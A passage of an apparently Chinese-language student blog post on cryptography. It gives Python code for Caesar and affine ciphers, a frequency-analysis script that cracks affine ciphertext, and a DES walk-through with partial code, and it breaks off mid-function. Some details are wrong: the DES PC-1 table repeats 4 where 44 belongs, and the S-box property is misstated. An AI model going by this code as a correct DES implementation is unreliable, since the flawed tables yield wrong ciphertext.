class="string">"decrypt"</span>:</span><br><span class="line">	cipher = raw_input(<span class="string">"Please input cipher: "</span>)</span><br><span class="line">	key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">	pla = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">		temp = (ord(cipher[i])-ord(<span class="string">"a"</span>) - key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">		pla += chr(temp)</span><br><span class="line">	print(<span class="string">"plaintext: "</span> + pla)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(sys.argv[<span class="number">1</span>],<span class="string">" is not supported:("</span>)</span><br></pre></td></tr></table></figure>
<p><img src="crypto1/1.png" alt="demo"></p>
<blockquote>
<p>安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受<strong>已知明文攻击</strong>时完全没有抵抗性，故而现代密码体制中已不再采用该密码。</p>
</blockquote>
<h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><p>仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 <code>y≡e(x)≡ax+b(mod 26)</code>，其中a,b均为26以内的正整数，并且要求<code>gcd(a,26)=1</code>，函数e(x)称为仿射加密函数，解密时用<code>x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)</code>来解密。</p>
<p><em>代码如下：</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_re</span><span class="params">(a)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">27</span>):</span><br><span class="line">		<span class="keyword">if</span> i*a % <span class="number">26</span> == <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment"># ex = ax+b</span></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">	p = str(input(<span class="string">"Plz input plain: "</span>))</span><br><span class="line">	a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">	b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">	c = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">		t = ((ord(p[i]) - ord(<span class="string">'a'</span>)) * a + b) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">		c += chr(t)</span><br><span class="line">	print(<span class="string">"cipher: "</span> + c)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line">	<span class="comment"># a'(e(x)-b)</span></span><br><span class="line">	c = str(input(<span class="string">"Plz input cipher: "</span>))</span><br><span class="line">	a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">	b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">	p = <span class="string">""</span></span><br><span class="line">	_a = get_re(a)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)): </span><br><span class="line">		t = (ord(c[i]) - ord(<span class="string">'a'</span>) - b)*_a % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">		p += chr(t)</span><br><span class="line">	print(<span class="string">"plain: "</span> + p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">"Input Error:("</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。</p>
</blockquote>
<p><em>实例演示</em></p>
<p><img src="crypto1/2.png" alt="demo"></p>
<hr>
<p>　　可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。</p>
<p><em>频率分析法破解仿射密码</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，</span><br><span class="line">此时可以通过频率分析法尝试爆破出明文</span><br></pre></td></tr></table></figure>
<p><em>代码如下</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">freq = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 频率统计</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	t = ord(cipher[i])-ord(<span class="string">'a'</span>)</span><br><span class="line">	freq[t] += <span class="number">1</span>	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ab</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">	repeat = []   <span class="comment"># 去除重复计算的项</span></span><br><span class="line">	<span class="keyword">for</span> one <span class="keyword">in</span> dic:</span><br><span class="line">		<span class="keyword">for</span> two <span class="keyword">in</span> dic:</span><br><span class="line">			o = ord(one) - ord(<span class="string">'a'</span>)</span><br><span class="line">			t = ord(two) - ord(<span class="string">'a'</span>)</span><br><span class="line">			oo = ord(x) - ord(<span class="string">'a'</span>)</span><br><span class="line">			tt = ord(y) - ord(<span class="string">'a'</span>)</span><br><span class="line">			<span class="comment"># oo = a*o+b</span></span><br><span class="line">			<span class="comment"># tt = a*t+b</span></span><br><span class="line">			<span class="keyword">if</span> o - t == <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			a = ((oo-tt)//(o-t)) % <span class="number">26</span></span><br><span class="line">			b = (oo - a * o) % <span class="number">26</span></span><br><span class="line">			test =  int(gmpy2.gcd(a, <span class="number">26</span>))</span><br><span class="line">			<span class="keyword">if</span> test != <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				_a = gmpy2.invert(a, <span class="number">26</span>)</span><br><span class="line">			plain = <span class="string">""</span></span><br><span class="line">			<span class="keyword">if</span> (a,b) <span class="keyword">in</span> repeat:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">				ex = ord(item) - ord(<span class="string">'a'</span>)</span><br><span class="line">				p = (_a * (ex - b)) % <span class="number">26</span></span><br><span class="line">				plain += chr(p+ord(<span class="string">'a'</span>))</span><br><span class="line">			repeat.append((a,b))</span><br><span class="line">			print(plain,end=<span class="string">""</span>)</span><br><span class="line">			print(<span class="string">"**"</span> + str(a) + <span class="string">"**"</span> + str(b))</span><br><span class="line">	print(<span class="string">"共"</span> + str(len(repeat)) + <span class="string">"项."</span>)</span><br><span class="line"></span><br><span class="line">x = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">freq[freq.index(max(freq))] = <span class="number">0</span></span><br><span class="line">y = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">get_ab(x,y)</span><br></pre></td></tr></table></figure>
<p>代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。</p>
<p><img src="crypto1/3.png" alt="demo"></p>
<p>可以看到密文被成功破解</p>
<hr>
<p>　　从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。</p>
<h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h1><h2 id="DES加密算法"><a href="#DES加密算法" class="headerlink" title="DES加密算法"></a>DES加密算法</h2><p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 </p>
<p>DES加密流程如下图</p>
<p><img src="crypto1/5.png" alt="demo"></p>
<p>解密时只需要将机密流程逆序即可。</p>
<p>算法大致步骤如下：</p>
<ol>
<li>初始置换</li>
</ol>
<p>​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。</p>
<hr>
<p>下一步是进行轮函数（F函数）迭代，F函数具体步骤如下</p>
<ol>
<li>扩展置换（E盒）</li>
</ol>
<p>初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。</p>
<p>该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。</p>
<ol>
<li>秘钥加运算</li>
</ol>
<p>该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。</p>
<ol>
<li>代换盒（S盒）</li>
</ol>
<p>此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。</p>
<p>代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果</p>
<p>S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。</p>
<ol>
<li>置换运算（P盒）</li>
</ol>
<p>置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。</p>
<p>至此<strong>F函数</strong>结束</p>
<hr>
<ol>
<li>逆置换</li>
</ol>
<p>将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为<strong>F函数</strong>。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。</p>
<p><em>代码如下：</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ip = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>,</span><br><span class="line"><span class="number">15</span>, <span class="number">7</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, </span><br><span class="line"><span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆矩阵</span></span><br><span class="line">_ip = [<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, </span><br><span class="line"><span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, </span><br><span class="line"><span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, </span><br><span class="line"><span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化c、d数组</span></span><br><span class="line">c = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">d = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">k = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左右32位数组</span></span><br><span class="line">l = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">r = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_secretkey</span><span class="params">(key, round)</span>:</span></span><br><span class="line">	pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, </span><br><span class="line">		<span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">62</span>, <span class="number">54</span>, </span><br><span class="line">		<span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, </span><br><span class="line">		<span class="number">4</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>]</span><br><span class="line">	respc1 = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">		respc1 += key[pc1[i]]</span><br><span class="line">	c[<span class="number">0</span>] = respc1[:<span class="number">28</span>]</span><br><span class="line">	d[<span class="number">0</span>] = respc1[<span class="number">28</span>:]</span><br><span class="line">	k[<span class="number">0</span>] = c[<span class="number">0</span>] + d[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,round+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">16</span>):</span><br><span class="line">			<span class="comment"># 左移1位</span></span><br><span class="line">			c[i] = c[i<span class="number">-1</span>][<span class="number">1</span>:] + c[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line">			d[i] = d[i<span class="number">-1</span>][<span class="number">1</span>:] + d[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			c[i] = c[i<span class="number">-1</span>][<span class="number">2</span>:] + c[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">			d[i] = d[i<span class="number">-1</span>][<span class="number">2</span>:] + d[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">	secret = c[round] + d[round]</span><br><span class="line">	pc2 = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,</span><br><span class="line">		<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,</span><br><span class="line">		<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">	s_key = <span class="string">""</span> <span class="comment"># 生成本轮最终秘钥</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">		s_key += secret[pc2[i]<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> s_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始置换，输入为64位数据，8个ascii字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">	re = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">		re += data[ip[i]]</span><br><span class="line">	<span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展置换，输入为32位数据，输出为48位数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">	e_box = [<span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, </span><br><span class="line">		<span class="number">12</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, </span><br><span class="line">		<span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span>]</span><br><span class="line">	re = [<span class="string">'a'</span>] * <span class="number">48</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">		re[i] = 